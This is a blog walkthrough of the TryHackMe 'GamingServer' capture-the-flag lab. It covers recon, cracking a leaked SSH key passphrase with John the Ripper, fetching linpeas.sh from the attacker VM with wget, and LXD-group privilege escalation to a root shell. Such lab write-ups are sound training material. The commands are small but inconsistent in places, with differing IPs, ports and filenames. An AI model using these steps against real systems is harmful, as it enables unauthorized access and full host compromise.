---
layout: post
title: TryHackMe | GamingServer
categories: THM
---

# TryHackMe | GamingServer

+++++++++++++++++++++++++++++++++++\
IP: 10.10.219.41\
Date: 09-06-2023\
+++++++++++++++++++++++++++++++++++

# CTF GamingServer - Write-up

![image](https://github.com/PingBackHome/PingBackHome.github.io/assets/115549820/81ab0177-cc39-4d10-8e50-a3f8add51b6b)


## Introduction

Welcome to the official write-up for the CTF GamingServer on TryHackMe! This challenging Capture The Flag (CTF) machine will test your penetration testing and network security skills. \
With the machine's IP address set to 10.10.217.247, you'll step into the world of a fictional gaming server susceptible to various security vulnerabilities.

In this write-up, we will explore the different steps and methods required to gain access to the GamingServer and retrieve the flags.\ 
We will utilize interesting techniques and tools to identify and exploit potential vulnerabilities, strategically think and collaborate to overcome obstacles.

Whether you are a beginner or an experienced ethical hacker, this CTF machine offers a great learning experience to enhance your skills and expand your knowledge of penetration testing. \
Let's dive into exploring the GamingServer and see what lies ahead!

*Note: This write-up contains spoilers and detailed solutions. It is advisable to attempt completing the CTF machine on your own before referring to this write-up.*

## Recon

**nmap scanning**

To begin our reconnaissance of the GamingServer, we will perform an Nmap scan using the flags `-sC -sV -A`. This combination of flags allows us to perform a comprehensive scan, including default script scanning, version detection, and aggressive scanning techniques.

Open a terminal and execute the following command to initiate the Nmap scan:

`nmap -sC -sV -A 10.10.217.247`


Let's break down the flags used in the command:

- `-sC`: This flag enables default script scanning. Nmap will execute a set of scripts against the discovered open ports to gather information and identify potential vulnerabilities.

- `-sV`: This flag enables version detection. Nmap will attempt to determine the service and version running on open ports, providing us with valuable information for further enumeration and exploitation.

- `-A`: This flag enables aggressive scanning, which includes a combination of advanced scanning techniques like OS detection, version detection, script scanning, and traceroute.

Executing this command will initiate the Nmap scan against the target IP address, `10.10.217.247`. We will patiently wait for the scan to complete and examine the results to identify potential entry points and areas of interest.

Let's run the Nmap scan and analyze the results!

*Note: Ensure you have Nmap installed on your system before executing the command.*


**Nmap results**

<img width="576" alt="image" src="https://github.com/PingBackHome/PingBackHome.github.io/assets/115549820/730524dd-96e5-4da1-9bfe-2c79c45df2b0">


During the Nmap scan of the GamingServer, we discovered the following open ports:

1. Port 22/tcp (ssh): Open
   - Service: OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

2. Port 80/tcp (http): Open
   - Service: Apache httpd 2.4.29 ((Ubuntu))
   - HTTP Title: House of danak
   - HTTP Server Header: Apache/2.4.29 (Ubuntu)

Based on the scan results, we have SSH (Secure Shell) running on port 22, and an Apache HTTP server on port 80. These open ports provide potential entry points for further investigation and exploitation.

**Homepage source code**

<img width="635" alt="image" src="https://github.com/PingBackHome/PingBackHome.github.io/assets/115549820/5381ef63-667d-4c71-b7cd-a94ebf9e7525">

Possible username?\
`john`

**Dirbuster scan**

The following are the results of the DirBuster scan performed on the target IP address using the specified parameters:

- Wordlist: `/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`

<img width="670" alt="image" src="https://github.com/PingBackHome/PingBackHome.github.io/assets/115549820/6dd11dc2-6f6c-42d1-b0fd-ef297792b9f6">

Based on the DirBuster scan results, the following interesting findings were discovered:

1. Directory: `/secret/`
   - Contains: `secretKey`

2. Directory: `/uploads/`
   - Contains: `manifesto.txt`
   - Contains: `dict.lst`

These findings indicate potentially sensitive information that may be worth exploring further in the subsequent steps of our penetration testing.

In the next section, we will focus on examining the content of these directories and files, and identify any vulnerabilities or exploitable areas.


**Examine dirbuster output**

`manifesto.txt`

<img width="670" alt="image" src="https://github.com/PingBackHome/PingBackHome.github.io/assets/115549820/c9c203fb-7bd0-4a35-b2bb-dd2a5573ab20">

`dict.lst`

<img width="670" alt="image" src="https://github.com/PingBackHome/PingBackHome.github.io/assets/115549820/d33c3a37-bf0d-4bbc-a7c0-7224367124af">

`secretKey`

<img width="670" alt="image" src="https://github.com/PingBackHome/PingBackHome.github.io/assets/115549820/79237d1f-27e5-42ad-ba47-39bf1c052475">


## Acces

**PrivateKey**

I created a new file using the 'touch' command and pasted the private key from /secret/secretKey into it.\
After that, I modified the permissions using chmod 600. Please refer to the screenshot below:

<img width="678" alt="image" src="https://github.com/PingBackHome/PingBackHome.github.io/assets/115549820/aa5e05d8-46bf-44f0-8b4e-aebf0914920e">

<img width="694" alt="image" src="https://github.com/PingBackHome/PingBackHome.github.io/assets/115549820/4d899b3b-ec83-42db-99d4-1e9fd4cd6e01">

In our adventure to gain access to a remote server, we stumbled upon a locked SSH private key. \
The key held the promise of granting us entry, but it was protected by a passphrase. \
Fortunately, our resourcefulness led us to discover a password list among the uploaded files. \
With this newfound knowledge, we decided to employ the power of ssh2john to crack the SSH private key.

But what exactly is ssh2john and how does it work? Well, ssh2john is a tool that assists in converting an SSH private key file into a format suitable for password cracking. \
It is often used in conjunction with John the Ripper, a popular password cracking program. \
By leveraging the capabilities of ssh2john, we could attempt to decrypt the passphrase and gain access to the private key's contents.

To make effective use of ssh2john, we must provide it with the private key file and redirect its output to a file that John the Ripper can utilize. \
The following flags are crucial in this process:

    -i PrivateKey: This flag specifies the path to the SSH private key file we intend to crack.
    > privatekey.hash: By redirecting the output using the greater-than symbol (>), we create a new file named privatekey.hash to store the converted format.

Once we have the converted hash file, we can proceed with running John the Ripper using the cracked SSH private key.\
With a little luck and the power of computational brute force, we might just uncover the passphrase and gain access to the coveted server.

<img width="487" alt="image" src="https://github.com/PingBackHome/PingBackHome.github.io/assets/115549820/eabfe839-0bb5-4a18-817c-b6469fac8594">

To optimize our cracking process, it's essential to have a well-organized wordlist with only unique entries. \
We can achieve this by executing the following command:\
`sort dict.lst | uniq > dict_su.txt`

<img width="487" alt="image" src="https://github.com/PingBackHome/PingBackHome.github.io/assets/115549820/fdb31b41-d800-486f-b0fc-0ecad0534e38">

By examining the accompanying screenshot, you'll notice that our initial wordlist contained 221 words, which has now been reduced to 203 words. 
Now, we are ready to commence the actual cracking of the SSH key.

In our quest to gain access to the SSH key, we utilized the powerful tool called John the Ripper. 
Armed with a sorted and filtered wordlist, we embarked on the cracking process to uncover the passphrase protecting the SSH key.

Using the command:
`john --wordlist=/home/kali/Desktop/THM/gameserver/dict_su.txt Private.hash`

We initiated John the Ripper, providing it with the path to the filtered wordlist file and the target hash file (Private.hash). The hash file contained a single SSH private key hash (RSA/DSA/EC/OPENSSH 32/64), hinting at the type of key we were dealing with.

John the Ripper began its work, employing its brute-force capabilities to test various combinations of the words from the wordlist as potential passphrases for the SSH key. As the cracking process unfolded, a moment of triumph arrived when the correct passphrase was discovered.

The successful result was revealed:

<img width="612" alt="image" src="https://github.com/PingBackHome/PingBackHome.github.io/assets/115549820/01f63201-fa62-4c06-9409-3daff834712e">

<img width="730" alt="image" src="https://github.com/PingBackHome/PingBackHome.github.io/assets/115549820/3428a4f3-ca94-4f75-b0c5-2e0782c79f9a">

## Internal Enumeration

To start our exploration, we focus on the low-hanging fruit—finding the "user.txt" flag. \
This flag is often located in the user's home directory, making it an ideal first target for discovery.

Let's navigate to the user's home directory and see if we can locate the coveted "user.txt" flag.\
<img width="536" alt="image" src="https://github.com/PingBackHome/PingBackHome.github.io/assets/115549820/5402c65e-926b-4841-bf7c-eefd6079b031">

In our quest for comprehensive internal enumeration, we will employ a powerful tool called linpeas.sh. This tool provides in-depth analysis and identification of potential vulnerabilities within the target system.

To begin, we need to transfer the linpeas.sh script from my local VM to the victim's VM. We will utilize a Python3 HTTP server and the wget command for this process. Follow the steps below:

1. On my VM, open a terminal and navigate to the directory where linpeas.sh is located.
2. Start a Python3 HTTP server by running the following command:

`python3 -m http.server 8818`\
<img width="527" alt="image" src="https://github.com/PingBackHome/PingBackHome.github.io/assets/115549820/3d3ba981-f934-4308-b753-35e8664c7b38">

3. On the victim's VM, open a terminal and navigate to the desired directory where you want to save linpeas.sh.
4. Use the wget command to download linpeas.sh from the HTTP server:

`wget http://<my_VM_IP>:8000/linpeas.sh`\
<img width="933" alt="image" src="https://github.com/PingBackHome/PingBackHome.github.io/assets/115549820/3d3d88e6-5c12-4c19-935a-8224da6a286e">

The last step is to modify the permissions for linpeas.sh. \
To accomplish this, we will use the following command: `chmod +x linpeas.sh`.\
<img width="933" alt="image" src="https://github.com/PingBackHome/PingBackHome.github.io/assets/115549820/d104ff30-c721-4d07-a651-839bd25ced7f">

<img width="495" alt="image" src="https://github.com/PingBackHome/PingBackHome.github.io/assets/115549820/adf1dcc8-753e-4a41-bb2a-9b1ccb7acafd">

<img width="733" alt="image" src="https://github.com/PingBackHome/PingBackHome.github.io/assets/115549820/b44d8e48-00f3-47f0-bb33-4d631280fd73">


## PrivEsc

As you can see in the screenshots above, we are a member of the LXD group. \
If we look on Hacktricks and search for LXD, we can find a privilege escalation. \
See the link: [LXD Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)

<img width="888" alt="image" src="https://github.com/PingBackHome/PingBackHome.github.io/assets/115549820/0d09787a-be0a-428c-8f2b-c8961251022c">

To utilize the privilege escalation, we first need to download the GitHub repository containing the LXD Alpine builder.\
You can find it at: [saghul/lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder.git)

<img width="562" alt="image" src="https://github.com/PingBackHome/PingBackHome.github.io/assets/115549820/ddd109b2-ff29-4b71-adbf-9143888dbddf">

Using the alpine-builder, we first create an image by executing the following command:\
`sudo ./build-alpine -a i686`

<img width="562" alt="image" src="https://github.com/PingBackHome/PingBackHome.github.io/assets/115549820/cb230ab6-75f5-42f7-8d0d-64cb521db26c">

After reading the directory with `ls`, we can see that we have a new .tar.gz file. \
We will upload this file to the victim's computer using a simple Python HTTP server in the terminal. \
Execute the following command:\
`python3 -m http.server 8800`

<img width="619" alt="image" src="https://github.com/PingBackHome/PingBackHome.github.io/assets/115549820/0cb83239-7a5e-4fe6-9784-40a7553fff06">

Explanation:
- `python3`: This command invokes the Python 3 interpreter.
- `-m http.server`: This is a module in Python's standard library that provides a simple HTTP server.
- `8800`: It specifies the port number (8800 in this case) on which the server will listen for incoming connections.

On the victim's machine, we initiate the download using the `wget` command. Let's proceed with that.

<img width="949" alt="image" src="https://github.com/PingBackHome/PingBackHome.github.io/assets/115549820/35574c5a-f861-4657-ab4d-22e1a3ab59d5">

Now that we have the image on the victim's machine, we will load the image into LXD using the following syntax:

`lxc image import alpine-v3.18-i686-20230612_0649.tar.gz --alias PrivEsc`

<img width="949" alt="image" src="https://github.com/PingBackHome/PingBackHome.github.io/assets/115549820/9282d4d1-fc0b-4755-a786-4b98bd79e70a">

Explanation of flags:
- `image import`: This flag is used to import an image into LXD.
- `alpine-v3.18-i686-20230612_0649.tar.gz`: This specifies the filename of the image file we want to import.
- `--alias PrivEsc`: This flag sets an alias for the imported image, allowing us to refer to it by the name "PrivEsc" in LXD commands.

<img width="949" alt="image" src="https://github.com/PingBackHome/PingBackHome.github.io/assets/115549820/d0e80a85-3600-4200-901f-6ea7dd7685d2">

Now that we have loaded the image, we will assign some additional properties to the container. We want the container to have elevated privileges (root access), which can be achieved using the following command:

`lxc init PrivEsc -c security.privileged=true`


Explanation of the command:
- `lxc init`: This command is used to initialize a new container.
- `PrivEsc`: This refers to the alias of the previously imported image.
- `-c security.privileged=true`: This flag sets the `security.privileged` property to `true` for the container. By enabling this property, the container will have elevated privileges and will be able to perform tasks that require root access.

By executing this command, we are configuring the container to have increased privileges, allowing it to operate with root-level permissions.

<img width="833" alt="image" src="https://github.com/PingBackHome/PingBackHome.github.io/assets/115549820/e3bb4d92-72aa-48ed-a2ce-bea255608ac6">

Now, all that remains is to start the container and request a shell.\
To start the container, use the following command:\
`lxc start <container name>`

To start a shell within the container, use the following command:

`lxc exec <container name> /bin/sh`


Explanation of the commands:
- `lxc start <container name>`: This command starts the specified container. Replace `<container name>` with the actual name of the container you want to start.
- `lxc exec <container name> /bin/sh`: This command opens a shell within the specified container. Again, replace `<container name>` with the name of the container where you want to start the shell.

By executing these commands, you will be able to start the container and access a shell inside it.\
<img width="399" alt="image" src="https://github.com/PingBackHome/PingBackHome.github.io/assets/115549820/57e5d210-02c4-49b6-9906-7053a2bec8eb">

find / -type f -name root.txt 2>/dev/null



